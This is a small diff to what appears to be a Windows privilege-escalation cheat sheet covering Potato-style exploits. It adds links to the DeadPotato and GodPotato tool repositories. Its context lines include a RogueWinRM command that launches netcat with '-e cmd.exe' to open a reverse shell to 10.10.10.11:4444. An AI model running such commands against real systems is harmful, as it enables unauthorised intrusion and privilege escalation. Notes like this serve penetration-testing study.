@@ -30,3 +30,7 @@ C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,
 ```powershell
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.10.10.11 4444"
 ```
+
+{% embed url="https://github.com/lypd0/DeadPotato.git" %}
+
+{% embed url="https://github.com/BeichenDream/GodPotato.git" %}
